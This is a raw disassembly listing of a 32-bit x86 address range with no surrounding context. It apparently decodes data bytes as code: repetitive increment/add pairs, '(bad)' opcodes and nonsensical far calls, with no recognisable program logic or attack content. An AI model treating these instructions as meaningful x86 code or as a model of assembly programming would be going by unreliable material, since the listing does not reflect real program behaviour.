  4424c6:	inc    DWORD PTR [eax]
  4424c8:	add    BYTE PTR [edi],cl
  4424ca:	inc    DWORD PTR [eax]
  4424cc:	add    BYTE PTR [edx],cl
  4424ce:	inc    DWORD PTR [eax]
  4424d0:	add    BYTE PTR [ebx],cl
  4424d2:	inc    DWORD PTR [eax]
  4424d4:	add    BYTE PTR [ebx],cl
  4424d6:	inc    DWORD PTR [eax]
  4424d8:	add    BYTE PTR [edx],cl
  4424da:	inc    DWORD PTR [eax]
  4424dc:	add    BYTE PTR [ebx],cl
  4424de:	inc    DWORD PTR [eax]
  4424e0:	add    BYTE PTR [eax],cl
  4424e2:	inc    DWORD PTR [eax]
  4424e4:	add    BYTE PTR [ebx],dl
  4424e6:	inc    DWORD PTR [eax]
  4424e8:	add    BYTE PTR [eax],ch
  4424ea:	inc    DWORD PTR [eax]
  4424ec:	add    BYTE PTR [edi+edi*8+0x0],al
  4424f0:	add    BYTE PTR [edi-0x1],dh
  4424f3:	add    DWORD PTR [eax+eiz*4],ecx
  4424f6:	dec    DWORD PTR ds:0x5ffc51b
  4424fc:	add    eax,esp
  4424fe:	inc    DWORD PTR [eax]
  442500:	add    dh,bh
  442502:	inc    DWORD PTR [eax]
  442504:	add    BYTE PTR [edx-0x1],dl
  442507:	push   ss
  442508:	sbb    ebp,DWORD PTR [esi]
  44250a:	jmp    DWORD PTR [edx+ebp*1]
  44250d:	dec    ebp
  44250e:	call   FWORD PTR [edi]
  442510:	daa    
  442511:	dec    ebx
  442512:	call   FWORD PTR ds:0xdff461f
  442518:	cmove  edi,edi
  44251b:	sbb    DWORD PTR [edi*1+0x1613ff],esp
  442522:	inc    DWORD PTR [eax]
  442524:	or     cl,bl
  442526:	inc    DWORD PTR [eax]
  442528:	add    BYTE PTR [edi-0x7affff01],bh
  44252e:	inc    DWORD PTR [eax]
  442530:	add    BYTE PTR [edx-0x1],dl
  442533:	add    BYTE PTR [eax],al
  442535:	xor    eax,0x1d0000ff
  44253a:	inc    DWORD PTR [eax]
  44253c:	add    BYTE PTR [edi+edi*8],dl
  44253f:	add    BYTE PTR [eax],al
  442541:	push   cs
  442542:	inc    DWORD PTR [eax]
  442544:	add    BYTE PTR [edi],al
  442546:	inc    DWORD PTR [eax]
  442548:	add    BYTE PTR [edi],al
  44254a:	inc    DWORD PTR [eax]
  44254c:	add    BYTE PTR ds:0x210000ff,cl
  442552:	inc    DWORD PTR [eax]
  442554:	add    BYTE PTR [esi-0x1],al
  442557:	add    BYTE PTR [eax],al
  442559:	js     0x44255a
  44255b:	add    ecx,DWORD PTR [edi]
  44255d:	int    0xff
  44255f:	adc    BYTE PTR [ebx],bl
  442561:	mov    bh,0xff
  442563:	daa    
  442564:	and    ebx,DWORD PTR [ebx]
  442566:	jmp    DWORD PTR [ecx]
  442568:	and    eax,0x1f17ff63
  44256d:	call   DWORD PTR [si]
  442570:	sbb    ebx,DWORD PTR [edi-0x1]
  442573:	adc    DWORD PTR [ecx],ebx
  442575:	call   DWORD PTR [bx+di]
  442578:	sbb    eax,0x1912ff6c
  44257d:	ja     0x44257e
  44257f:	sbb    BYTE PTR [edx],bl
  442581:	push   0xffffffff
  442583:	and    eax,0x15ff7b2c
  442588:	sbb    al,0x57
  44258a:	call   FWORD PTR [edx]
  44258c:	sbb    eax,0x2829ff3d
  442591:	sub    edi,edi
  442593:	and    eax,0x7ff2e24
  442598:	sbb    al,0xa9
  44259a:	call   DWORD PTR [ebx]
  44259c:	cmp    ecx,edx
  44259e:	call   DWORD PTR [esp+ebx*1]
  4425a1:	stc    
  4425a2:	inc    DWORD PTR [edx]
  4425a4:	add    bh,BYTE PTR [edi-0x1]
  4425a7:	add    BYTE PTR [eax],al
  4425a9:	push   esi
  4425aa:	inc    DWORD PTR [eax]
  4425ac:	add    BYTE PTR [eax],dh
  4425ae:	inc    DWORD PTR [eax]
  4425b0:	add    BYTE PTR [ebx],bl
  4425b2:	inc    DWORD PTR [eax]
  4425b4:	add    BYTE PTR [edi+edi*8],cl
  4425b7:	add    BYTE PTR [eax],al
  4425b9:	or     edi,edi
  4425bb:	add    BYTE PTR [eax],al
  4425bd:	or     edi,edi
  4425bf:	add    BYTE PTR [eax],al
  4425c1:	or     al,0xff
  4425c3:	add    BYTE PTR [eax],al
  4425c5:	or     eax,0xb0000ff
  4425ca:	inc    DWORD PTR [eax]
  4425cc:	add    BYTE PTR [edi+edi*8],cl
  4425cf:	add    BYTE PTR [eax],al
  4425d1:	or     edi,edi
  4425d3:	add    BYTE PTR [eax],al
  4425d5:	ud0    eax,DWORD PTR [eax]
  4425d8:	add    BYTE PTR [ebx],cl
  4425da:	inc    DWORD PTR [eax]
  4425dc:	add    BYTE PTR [edx],cl
  4425de:	inc    DWORD PTR [eax]
  4425e0:	add    BYTE PTR [edi],cl
  4425e2:	inc    DWORD PTR [eax]
  4425e4:	add    BYTE PTR [eax],dl
  4425e6:	inc    DWORD PTR [eax]
  4425e8:	add    BYTE PTR [eax],dl
  4425ea:	inc    DWORD PTR [eax]
  4425ec:	add    BYTE PTR [edi],cl
  4425ee:	inc    DWORD PTR [eax]
  4425f0:	add    BYTE PTR [esi],cl
  4425f2:	inc    DWORD PTR [eax]
  4425f4:	add    BYTE PTR ds:0xd0000ff,cl
  4425fa:	inc    DWORD PTR [eax]
  4425fc:	add    BYTE PTR [edi],dl
  4425fe:	inc    DWORD PTR [eax]
  442600:	add    BYTE PTR ds:0x150000ff,dl
  442606:	inc    DWORD PTR [eax]
  442608:	add    BYTE PTR [edi+edi*8],dl
  44260b:	add    BYTE PTR [eax],al
  44260d:	adc    al,0xff
  44260f:	add    BYTE PTR [eax],al
  442611:	adc    bh,bh
  442613:	add    BYTE PTR [eax],al
  442615:	adc    edi,edi
  442617:	add    BYTE PTR [eax],al
  442619:	adc    edi,edi
  44261b:	add    BYTE PTR [eax],al
  44261d:	adc    edi,edi
  44261f:	add    BYTE PTR [eax],al
  442621:	push   cs
  442622:	inc    DWORD PTR [eax]
  442624:	add    BYTE PTR [ecx],dl
  442626:	inc    DWORD PTR [eax]
  442628:	add    BYTE PTR [edi],cl
  44262a:	inc    DWORD PTR [eax]
  44262c:	add    BYTE PTR [eax],dl
  44262e:	inc    DWORD PTR [eax]
  442630:	add    BYTE PTR [ebx],cl
  442632:	inc    DWORD PTR [eax]
  442634:	add    BYTE PTR [edx],dl
  442636:	inc    DWORD PTR [eax]
  442638:	add    BYTE PTR [esi],cl
  44263a:	inc    DWORD PTR [eax]
  44263c:	add    BYTE PTR ds:0xc0000ff,cl
  442642:	inc    DWORD PTR [eax]
  442644:	add    BYTE PTR [esi],cl
  442646:	inc    DWORD PTR [eax]
  442648:	add    BYTE PTR [eax],dl
  44264a:	inc    DWORD PTR [eax]
  44264c:	add    BYTE PTR [ecx],dl
  44264e:	inc    DWORD PTR [eax]
  442650:	add    BYTE PTR [edi],cl
  442652:	inc    DWORD PTR [eax]
  442654:	add    BYTE PTR [edi],cl
  442656:	inc    DWORD PTR [eax]
  442658:	add    BYTE PTR [eax],dl
  44265a:	inc    DWORD PTR [eax]
  44265c:	add    BYTE PTR [edi],cl
  44265e:	inc    DWORD PTR [eax]
  442660:	add    BYTE PTR [ecx],dl
  442662:	inc    DWORD PTR [eax]
  442664:	add    BYTE PTR [ecx],dl
  442666:	inc    DWORD PTR [eax]
  442668:	add    BYTE PTR [ebx],ah
  44266a:	inc    DWORD PTR [eax]
  44266c:	add    BYTE PTR [edi+edi*8],bh
  44266f:	add    BYTE PTR [eax],al
  442671:	inc    DWORD PTR fs:[eax]
  442674:	add    BYTE PTR [ecx-0x22ecfb01],ah
  44267a:	inc    DWORD PTR [esi+ecx*1]
  44267d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44267e:	dec    DWORD PTR ds:0xaff1207
  442684:	push   cs
  442685:	pop    edx
  442686:	dec    DWORD PTR [ecx]
  442688:	sbb    eax,0xf01ff86
  44268d:	dec    esp
  44268e:	inc    DWORD PTR [edi]
  442690:	adc    al,0x3a
  442692:	dec    DWORD PTR [edi]
  442694:	sbb    DWORD PTR [ebx-0x1],eax
  442697:	or     DWORD PTR [ecx],edx
  442699:	sub    eax,0x36170cff
  44269e:	inc    DWORD PTR [eax+edx*1]
  4426a1:	inc    DWORD PTR cs:[eax]
  4426a4:	add    al,0x20
  4426a6:	dec    DWORD PTR [ecx]
  4426a8:	or     al,0x35
  4426aa:	call   DWORD PTR [ebx]
  4426ac:	inc    ebx
  4426ad:	mov    bh,0xff
  4426af:	add    BYTE PTR [eax],cl
  4426b1:	repnz inc DWORD PTR [eax]
  4426b4:	add    BYTE PTR [esi+0x540000ff],al
  4426ba:	inc    DWORD PTR [eax]
  4426bc:	add    BYTE PTR [edi+edi*8],ch
  4426bf:	add    BYTE PTR [eax],al
  4426c1:	sbb    bh,bh
  4426c3:	add    BYTE PTR [eax],al
  4426c5:	adc    edi,edi
  4426c7:	add    BYTE PTR [eax],al
  4426c9:	or     edi,edi
  4426cb:	add    BYTE PTR [eax],al
  4426cd:	push   cs
  4426ce:	inc    DWORD PTR [eax]
  4426d0:	add    BYTE PTR [ebx],cl
  4426d2:	inc    DWORD PTR [eax]
  4426d4:	add    BYTE PTR [edi+edi*8],cl
  4426d7:	add    BYTE PTR [eax],al
  4426d9:	or     bh,bh
  4426db:	add    BYTE PTR [eax],al
  4426dd:	or     edi,edi
  4426df:	add    BYTE PTR [eax],al
  4426e1:	or     bh,bh
  4426e3:	add    BYTE PTR [eax],al
  4426e5:	adc    bh,bh
  4426e7:	add    BYTE PTR [eax],al
  4426e9:	inc    DWORD PTR es:[eax]
  4426ec:	add    BYTE PTR [esi-0x1],al
  4426ef:	add    BYTE PTR [eax],al
  4426f1:	jns    0x4426f2
  4426f3:	add    BYTE PTR [eax],cl
  4426f5:	mov    edx,0xe53c0dff
  4426fa:	call   FWORD PTR ds:0xcff3932
  442700:	adc    dl,al
  442702:	inc    DWORD PTR [eax]
  442704:	add    dl,ch
  442706:	call   DWORD PTR [edx]
  442708:	adc    al,0x38
  44270a:	jmp    DWORD PTR [ebx]
  44270c:	sub    ecx,DWORD PTR [ebx-0x1]
  44270f:	pop    ds
  442710:	and    eax,0x201aff49
  442715:	push   edx
  442716:	call   DWORD PTR ds:0xdff2e18
  44271c:	adc    ch,BYTE PTR [edi+edi*8-0xa0e3e5]
  442723:	pop    ss
  442724:	and    eax,0x900ff94
  442729:	(bad)  
  44272a:	inc    DWORD PTR [eax]
  44272c:	add    BYTE PTR [ebp+0x510000ff],al
  442732:	inc    DWORD PTR [eax]
  442734:	add    BYTE PTR [edi],ch
  442736:	inc    DWORD PTR [eax]
  442738:	add    BYTE PTR [edi],dl
  44273a:	inc    DWORD PTR [eax]
  44273c:	add    BYTE PTR [esi],cl
  44273e:	inc    DWORD PTR [eax]
  442740:	add    BYTE PTR [edx],cl
  442742:	inc    DWORD PTR [eax]
  442744:	add    BYTE PTR [eax],cl
  442746:	inc    DWORD PTR [eax]
  442748:	add    BYTE PTR [edi],al
  44274a:	inc    DWORD PTR [eax]
  44274c:	add    BYTE PTR ds:0x230000ff,cl
  442752:	inc    DWORD PTR [eax]
  442754:	add    BYTE PTR [edx-0x1],cl
  442757:	add    BYTE PTR [eax],al
  442759:	jge    0x44275a
  44275b:	add    al,BYTE PTR [esi+eiz*8]
  44275e:	call   DWORD PTR [ecx]
  442760:	or     al,0xba
  442762:	call   FWORD PTR [edi]
  442764:	sbb    al,0x17
  442766:	jmp    DWORD PTR [edx]
  442768:	sub    BYTE PTR [ecx-0x1],dh
  44276b:	adc    DWORD PTR [edx],ebx
  44276d:	pop    ecx
  44276e:	call   DWORD PTR [eax]
  442770:	adc    bh,BYTE PTR [edx]
  442772:	call   DWORD PTR [edx]
  442774:	pop    ss
  442775:	dec    esi
  442776:	call   DWORD PTR [esi]
  442778:	and    eax,0x160bff78
  44277d:	xchg   ebx,eax
  44277e:	call   DWORD PTR [esi]
  442780:	sbb    DWORD PTR [eax+0x531c2aff],ebp
  442786:	jmp    FWORD PTR [ebx+ebp*1]
  442789:	pop    esi
  44278a:	jmp    DWORD PTR [ecx]
  44278c:	xor    al,0xa0
  44278e:	call   FWORD PTR [eax]
  442790:	and    ah,BYTE PTR [edi+edi*8-0x32f0f6]
  442797:	add    BYTE PTR [edi+eiz*8],al
  44279a:	inc    DWORD PTR ds:0xfffe41c
  4427a0:	es cld 
  4427a2:	inc    DWORD PTR [ecx]
  4427a4:	add    al,BYTE PTR [ebx+0x560000ff]
  4427aa:	inc    DWORD PTR [eax]
  4427ac:	add    BYTE PTR [edi+edi*8],dh
  4427af:	add    BYTE PTR [eax],al
  4427b1:	sbb    al,0xff
  4427b3:	add    BYTE PTR [eax],al
  4427b5:	or     eax,0xb0000ff
  4427ba:	inc    DWORD PTR [eax]
  4427bc:	add    BYTE PTR [ebx],cl
  4427be:	inc    DWORD PTR [eax]
  4427c0:	add    BYTE PTR [ecx],cl
  4427c2:	inc    DWORD PTR [eax]
  4427c4:	add    BYTE PTR [ebx],cl
  4427c6:	inc    DWORD PTR [eax]
  4427c8:	add    BYTE PTR ds:0x90000ff,cl
  4427ce:	inc    DWORD PTR [eax]
  4427d0:	add    BYTE PTR [ebx],cl
  4427d2:	inc    DWORD PTR [eax]
  4427d4:	add    BYTE PTR [edi+edi*8],cl
  4427d7:	add    BYTE PTR [eax],al
  4427d9:	or     eax,0xf0000ff
  4427de:	inc    DWORD PTR [eax]
  4427e0:	add    BYTE PTR [edi],cl
  4427e2:	inc    DWORD PTR [eax]
  4427e4:	add    BYTE PTR [esi],cl
  4427e6:	inc    DWORD PTR [eax]
  4427e8:	add    BYTE PTR [ecx],dl
  4427ea:	inc    DWORD PTR [eax]
  4427ec:	add    BYTE PTR [edi],cl
  4427ee:	inc    DWORD PTR [eax]
  4427f0:	add    BYTE PTR [ecx],dl
  4427f2:	inc    DWORD PTR [eax]
  4427f4:	add    BYTE PTR [esi],cl
  4427f6:	inc    DWORD PTR [eax]
  4427f8:	add    BYTE PTR [esi],cl
  4427fa:	inc    DWORD PTR [eax]
  4427fc:	add    BYTE PTR [eax],dl
  4427fe:	inc    DWORD PTR [eax]
  442800:	add    BYTE PTR [esi],cl
  442802:	inc    DWORD PTR [eax]
  442804:	add    BYTE PTR [ecx],dl
  442806:	inc    DWORD PTR [eax]
  442808:	add    BYTE PTR ds:0x120000ff,cl
  44280e:	inc    DWORD PTR [eax]
  442810:	add    BYTE PTR [eax],dl
  442812:	inc    DWORD PTR [eax]
  442814:	add    BYTE PTR [ecx],dl
  442816:	inc    DWORD PTR [eax]
  442818:	add    BYTE PTR [ecx],dl
  44281a:	inc    DWORD PTR [eax]
  44281c:	add    BYTE PTR [edi+edi*8],dl
  44281f:	add    BYTE PTR [eax],al
  442821:	adc    edi,edi
  442823:	add    BYTE PTR [eax],al
  442825:	pop    ss
  442826:	inc    DWORD PTR [eax]
  442828:	add    BYTE PTR [edi+edi*8],dl
  44282b:	add    BYTE PTR [eax],al
  44282d:	adc    edi,edi
  44282f:	add    BYTE PTR [eax],al
  442831:	adc    bh,bh
  442833:	add    BYTE PTR [eax],al
  442835:	adc    edi,edi
  442837:	add    BYTE PTR [eax],al
  442839:	ud0    eax,DWORD PTR [eax]
  44283c:	add    BYTE PTR [ecx],dl
  44283e:	inc    DWORD PTR [eax]
  442840:	add    BYTE PTR [esi],cl
  442842:	inc    DWORD PTR [eax]
  442844:	add    BYTE PTR [edx],dl
  442846:	inc    DWORD PTR [eax]
  442848:	add    BYTE PTR [esi],cl
  44284a:	inc    DWORD PTR [eax]
  44284c:	add    BYTE PTR [edx],dl
  44284e:	inc    DWORD PTR [eax]
  442850:	add    BYTE PTR [edx],dl
  442852:	inc    DWORD PTR [eax]
  442854:	add    BYTE PTR [ecx],dl
  442856:	inc    DWORD PTR [eax]
  442858:	add    BYTE PTR [ecx],dl
  44285a:	inc    DWORD PTR [eax]
  44285c:	add    BYTE PTR [edi],cl
  44285e:	inc    DWORD PTR [eax]
  442860:	add    BYTE PTR [esi],cl
  442862:	inc    DWORD PTR [eax]
  442864:	add    BYTE PTR [ecx],dl
  442866:	inc    DWORD PTR [eax]
  442868:	add    BYTE PTR [esi],bl
  44286a:	inc    DWORD PTR [eax]
  44286c:	add    BYTE PTR [edi+edi*8],bh
  44286f:	add    BYTE PTR [eax],al
  442871:	(bad)  
  442872:	inc    DWORD PTR [eax]
  442874:	add    DWORD PTR [edi+edi*8-0x3e300],esp
  44287b:	add    al,0x1f
  44287d:	mov    edi,edi
  44287f:	sbb    eax,0x18ff2114
  442884:	push   ss
  442885:	inc    eax
  442886:	inc    DWORD PTR [eax]
  442888:	add    BYTE PTR [edi+edi*8],ah
  44288b:	or     DWORD PTR ds:0x1b09ff89,ebx
  442891:	pop    esp
  442892:	dec    DWORD PTR [eax]
  442894:	adc    eax,0x180dff2f
  442899:	dec    ecx
  44289a:	dec    DWORD PTR [esi]
  44289c:	sbb    eax,0xc07ff44
  4428a1:	xor    al,0xff
  4428a3:	add    al,0xe
  4428a5:	cmp    bh,bh
  4428a7:	adc    bl,BYTE PTR [edx]
  4428a9:	push   ecx
  4428aa:	call   DWORD PTR ds:0xffd24c
  4428b0:	or     ebx,esi
  4428b2:	inc    DWORD PTR [eax]
  4428b4:	add    BYTE PTR [ecx+0x590000ff],dl
  4428ba:	inc    DWORD PTR [eax]
  4428bc:	add    BYTE PTR [ebx],dh
  4428be:	inc    DWORD PTR [eax]
  4428c0:	add    BYTE PTR [eax],bl
  4428c2:	inc    DWORD PTR [eax]
  4428c4:	add    BYTE PTR [esi],cl
  4428c6:	inc    DWORD PTR [eax]
  4428c8:	add    BYTE PTR [esi],cl
  4428ca:	inc    DWORD PTR [eax]
  4428cc:	add    BYTE PTR [eax],cl
  4428ce:	inc    DWORD PTR [eax]
  4428d0:	add    BYTE PTR [edx],cl
  4428d2:	inc    DWORD PTR [eax]
  4428d4:	add    BYTE PTR [edi],al
  4428d6:	inc    DWORD PTR [eax]
  4428d8:	add    BYTE PTR [esi],cl
  4428da:	inc    DWORD PTR [eax]
  4428dc:	add    BYTE PTR [ecx],cl
  4428de:	inc    DWORD PTR [eax]
  4428e0:	add    BYTE PTR [ecx],cl
  4428e2:	inc    DWORD PTR [eax]
  4428e4:	add    BYTE PTR [eax],dl
  4428e6:	inc    DWORD PTR [eax]
  4428e8:	add    BYTE PTR ds:0x490000ff,ah
  4428ee:	inc    DWORD PTR [eax]
  4428f0:	add    BYTE PTR [edx-0x1],bh
  4428f3:	add    BYTE PTR [ebx],cl
  4428f5:	aam    0xff
  4428f7:	or     esi,DWORD PTR [edx]
  4428f9:	(bad)  
  4428fb:	sbb    BYTE PTR [edi],ch
  4428fd:	cmp    edi,0xff4d2c1c
  442903:	adc    bl,BYTE PTR [edx]
  442905:	inc    ebp
  442906:	call   DWORD PTR [esi+edx*1]
  442909:	aaa    
  44290a:	call   FWORD PTR [ebx+eiz*1]
  44290d:	dec    esp
  44290e:	call   FWORD PTR [eax]
  442910:	pop    ds
  442911:	inc    eax
  442912:	call   DWORD PTR [ebx]
  442914:	adc    esi,DWORD PTR ds:0x1e1313ff
  44291a:	dec    DWORD PTR [edi+ecx*1]
  44291d:	ins    BYTE PTR es:[edi],dx
  44291e:	call   FWORD PTR [eax]
  442920:	sbb    dl,al
  442922:	jmp    DWORD PTR [ecx]
  442924:	add    al,0x0
  442926:	inc    DWORD PTR [ebx]
  442928:	cmp    esp,eax
  44292a:	inc    DWORD PTR [eax]
  44292c:	add    BYTE PTR [edi+0x570000ff],cl
  442932:	inc    DWORD PTR [eax]
  442934:	add    BYTE PTR [ecx],dh
  442936:	inc    DWORD PTR [eax]
  442938:	add    BYTE PTR [esi],dl
  44293a:	inc    DWORD PTR [eax]
  44293c:	add    BYTE PTR [edi+edi*8],cl
  44293f:	add    BYTE PTR [eax],al
  442941:	or     bh,bh
  442943:	add    BYTE PTR [eax],al
  442945:	push   es
  442946:	inc    DWORD PTR [eax]
  442948:	add    BYTE PTR [edi],al
  44294a:	inc    DWORD PTR [eax]
  44294c:	add    BYTE PTR [esi],cl
  44294e:	inc    DWORD PTR [eax]
  442950:	add    BYTE PTR [edi+edi*8],ah
  442953:	add    BYTE PTR [eax],al
  442955:	dec    ecx
  442956:	inc    DWORD PTR [eax]
  442958:	add    BYTE PTR [edi+edi*8+0x1],bh
  44295c:	add    ecx,esi
  44295e:	dec    DWORD PTR [edi]
  442960:	setns  bh
  442963:	and    bl,BYTE PTR [esi]
  442965:	and    eax,0x662321ff
  44296a:	call   DWORD PTR [ebx]
  44296c:	sbb    al,0x5b
  44296e:	call   DWORD PTR [eax]
  442970:	adc    al,0x3c
  442972:	dec    DWORD PTR ds:0x13ff2f11
  442978:	adc    eax,0x120dff43
  44297d:	call   DWORD PTR ss:0xdff942e
  442984:	sbb    eax,0x608ffe8
  442989:	jecxz  0x44298a
  44298b:	add    BYTE PTR [ecx],dl
  44298d:	(bad)  
  44298e:	inc    DWORD PTR [eax]
  442990:	ud0    edi,edi
  442993:	add    BYTE PTR [eax],al
  442995:	jmp    0x442996
  442997:	add    BYTE PTR [eax],al
  442999:	sar    edi,cl
  44299b:	add    BYTE PTR [eax],al
  44299d:	enter  0xff,0x1
  4429a1:	mov    ecx,0x800100ff
  4429a6:	inc    DWORD PTR [eax]
  4429a8:	add    BYTE PTR [ebp-0x1],cl
  4429ab:	add    BYTE PTR [eax],al
  4429ad:	sub    edi,edi
  4429af:	add    BYTE PTR [eax],al
  4429b1:	push   ss
  4429b2:	inc    DWORD PTR [eax]
  4429b4:	add    BYTE PTR [edx],cl
  4429b6:	inc    DWORD PTR [eax]
  4429b8:	add    BYTE PTR [edi+edi*8],cl
  4429bb:	add    BYTE PTR [eax],al
  4429bd:	or     bh,bh
  4429bf:	add    BYTE PTR [eax],al
  4429c1:	or     eax,0xb0000ff
  4429c6:	inc    DWORD PTR [eax]
  4429c8:	add    BYTE PTR [ebx],cl
  4429ca:	inc    DWORD PTR [eax]
  4429cc:	add    BYTE PTR [ecx],cl
  4429ce:	inc    DWORD PTR [eax]
  4429d0:	add    BYTE PTR [edx],cl
  4429d2:	inc    DWORD PTR [eax]
  4429d4:	add    BYTE PTR [edi+edi*8],cl
  4429d7:	add    BYTE PTR [eax],al
  4429d9:	or     bh,bh
  4429db:	add    BYTE PTR [eax],al
  4429dd:	or     bh,bh
  4429df:	add    BYTE PTR [eax],al
  4429e1:	or     edi,edi
  4429e3:	add    BYTE PTR [eax],al
  4429e5:	adc    bh,bh
  4429e7:	add    BYTE PTR [eax],al
  4429e9:	adc    edi,edi
  4429eb:	add    BYTE PTR [eax],al
  4429ed:	ud0    eax,DWORD PTR [eax]
  4429f0:	add    BYTE PTR [esi],cl
  4429f2:	inc    DWORD PTR [eax]
  4429f4:	add    BYTE PTR [edi],cl
  4429f6:	inc    DWORD PTR [eax]
  4429f8:	add    BYTE PTR [edx],dl
  4429fa:	inc    DWORD PTR [eax]
  4429fc:	add    BYTE PTR ds:0xf0000ff,cl
  442a02:	inc    DWORD PTR [eax]
  442a04:	add    BYTE PTR [edi],cl
  442a06:	inc    DWORD PTR [eax]
  442a08:	add    BYTE PTR [edx],dl
  442a0a:	inc    DWORD PTR [eax]
  442a0c:	add    BYTE PTR [eax],dl
  442a0e:	inc    DWORD PTR [eax]
  442a10:	add    BYTE PTR [ecx],dl
  442a12:	inc    DWORD PTR [eax]
  442a14:	add    BYTE PTR [edx],dl
  442a16:	inc    DWORD PTR [eax]
  442a18:	add    BYTE PTR [ecx],dl
  442a1a:	inc    DWORD PTR [eax]
  442a1c:	add    BYTE PTR [edi],cl
  442a1e:	inc    DWORD PTR [eax]
  442a20:	add    BYTE PTR [edi+edi*8],dl
  442a23:	add    BYTE PTR [eax],al
  442a25:	adc    al,0xff
  442a27:	add    BYTE PTR [eax],al
  442a29:	adc    al,0xff
  442a2b:	add    BYTE PTR [eax],al
  442a2d:	adc    edi,edi
  442a2f:	add    BYTE PTR [eax],al
  442a31:	adc    eax,0x100000ff
  442a36:	inc    DWORD PTR [eax]
  442a38:	add    BYTE PTR [eax],dl
  442a3a:	inc    DWORD PTR [eax]
  442a3c:	add    BYTE PTR [edi],cl
  442a3e:	inc    DWORD PTR [eax]
  442a40:	add    BYTE PTR [edi],cl
  442a42:	inc    DWORD PTR [eax]
  442a44:	add    BYTE PTR [esi],cl
  442a46:	inc    DWORD PTR [eax]
  442a48:	add    BYTE PTR [edx],cl
  442a4a:	inc    DWORD PTR [eax]
  442a4c:	add    BYTE PTR [eax],dl
  442a4e:	inc    DWORD PTR [eax]
  442a50:	add    BYTE PTR [edi+edi*8],cl
  442a53:	add    BYTE PTR [eax],al
  442a55:	or     al,0xff
  442a57:	add    BYTE PTR [eax],al
  442a59:	adc    edi,edi
  442a5b:	add    BYTE PTR [eax],al
  442a5d:	push   cs
  442a5e:	inc    DWORD PTR [eax]
  442a60:	add    BYTE PTR [eax],dl
  442a62:	inc    DWORD PTR [eax]
  442a64:	add    BYTE PTR [edx],dl
  442a66:	inc    DWORD PTR [eax]
  442a68:	add    BYTE PTR [esi],bl
  442a6a:	inc    DWORD PTR [eax]
  442a6c:	add    BYTE PTR [edi+edi*8],bh
  442a6f:	add    BYTE PTR [eax],al
  442a71:	inc    DWORD PTR fs:[eax]
  442a74:	add    ah,BYTE PTR [ebx-0x21d4f901]
  442a7a:	dec    DWORD PTR [esi]
  442a7c:	and    ch,BYTE PTR [ebx-0x1]
  442a7f:	and    eax,0x27ff351a
  442a84:	and    DWORD PTR [esi-0x1],eax
  442a87:	add    DWORD PTR [ecx+eax*2],ecx
  442a8a:	inc    DWORD PTR [esi]
  442a8c:	adc    al,0x47
  442a8e:	dec    DWORD PTR [edi+ebx*1]
  442a91:	cmp    bh,0xb
  442a94:	sbb    BYTE PTR [edi+edi*8+0xc],al
  442a98:	sbb    DWORD PTR [edi],edi
  442a9a:	dec    DWORD PTR [ecx+ebx*1]
  442a9d:	inc    eax
  442a9e:	inc    DWORD PTR [ecx*1+0x908ff37]
  442aa5:	xor    eax,0x31080dff
  442aaa:	call   DWORD PTR [esi]
  442aac:	push   esp
  442aad:	jmp    0x442aae
  442aaf:	add    BYTE PTR [edi],al
  442ab1:	iret   
  442ab2:	inc    DWORD PTR [eax]
  442ab4:	add    BYTE PTR [ebp+0x5f0000ff],dl
  442aba:	inc    DWORD PTR [eax]
  442abc:	add    BYTE PTR ds:0x170000ff,dh
  442ac2:	inc    DWORD PTR [eax]
  442ac4:	add    BYTE PTR [eax],cl
  442ac6:	inc    DWORD PTR [eax]
  442ac8:	add    BYTE PTR [edi+edi*8],cl
  442acb:	add    BYTE PTR [eax],al
  442acd:	or     al,0xff
  442acf:	add    BYTE PTR [eax],al
  442ad1:	or     bh,bh
  442ad3:	add    BYTE PTR [eax],al
  442ad5:	or     bh,bh
  442ad7:	add    BYTE PTR [eax],al
  442ad9:	or     al,0xff
  442adb:	add    BYTE PTR [eax],al
  442add:	or     bh,bh
  442adf:	add    BYTE PTR [eax],al
  442ae1:	or     eax,0x180000ff
  442ae6:	inc    DWORD PTR [eax]
  442ae8:	add    BYTE PTR [edi],ch
  442aea:	inc    DWORD PTR [eax]
  442aec:	add    BYTE PTR [ebx-0x1],dl
  442aef:	add    BYTE PTR [eax],al
  442af1:	jg     0x442af2
  442af3:	add    ecx,DWORD PTR [eax]
  442af5:	call   FWORD PTR [bx+di]
  442af8:	sub    eax,0x2b1bff83
  442afd:	mov    ?,edi
  442aff:	sbb    al,0x1f
  442b01:	pop    esp
  442b02:	call   FWORD PTR [edi]
  442b04:	and    al,0x48
  442b06:	jmp    DWORD PTR [ecx]
  442b08:	and    eax,DWORD PTR [esi-0x1]
  442b0b:	and    al,0x24
  442b0d:	inc    ebp
  442b0e:	call   FWORD PTR [edx]
  442b10:	sbb    eax,DWORD PTR [eax-0x1]
  442b13:	adc    DWORD PTR [ecx],edx
  442b15:	das    
  442b16:	call   DWORD PTR [ebx]
  442b18:	adc    BYTE PTR ds:0x4a120cff,ah
  442b1e:	call   DWORD PTR [eax]
  442b20:	setg   bh
  442b23:	sbb    al,0x0
  442b25:	add    bh,bh
  442b27:	pop    es
  442b28:	push   0x1300ffe5
  442b2d:	(bad)  
  442b2e:	inc    DWORD PTR [eax]
  442b30:	add    BYTE PTR [edi-0x1],bl
  442b33:	add    BYTE PTR [eax],al
  442b35:	xor    eax,0x190000ff
  442b3a:	inc    DWORD PTR [eax]
  442b3c:	add    BYTE PTR [edx],cl
  442b3e:	inc    DWORD PTR [eax]
  442b40:	add    BYTE PTR [eax],cl
  442b42:	inc    DWORD PTR [eax]
  442b44:	add    BYTE PTR [eax],cl
  442b46:	inc    DWORD PTR [eax]
  442b48:	add    BYTE PTR [esi],al
  442b4a:	inc    DWORD PTR [eax]
  442b4c:	add    BYTE PTR ds:0x1f0000ff,cl
  442b52:	inc    DWORD PTR [eax]
  442b54:	add    BYTE PTR [ebp-0x1],al
  442b57:	add    BYTE PTR [eax],al
  442b59:	jns    0x442b5a
  442b5b:	add    DWORD PTR [esp+ebx*8],eax
  442b5e:	call   DWORD PTR [eax]
  442b60:	or     eax,0x1920ff9c
  442b65:	and    al,0xff
  442b67:	sbb    al,0x1b
  442b69:	dec    ebp
  442b6a:	dec    DWORD PTR [edi]
  442b6c:	adc    BYTE PTR [edx],bh
  442b6e:	dec    DWORD PTR [edi]
  442b70:	adc    eax,0x100bff3e
  442b75:	cmp    al,0xff
  442b77:	adc    bl,BYTE PTR [eax]
  442b79:	dec    esp
  442b7a:	dec    DWORD PTR [edi+ecx*1]
  442b7d:	dec    edi
  442b7e:	call   FWORD PTR [eiz*1+0x1812ff4f]
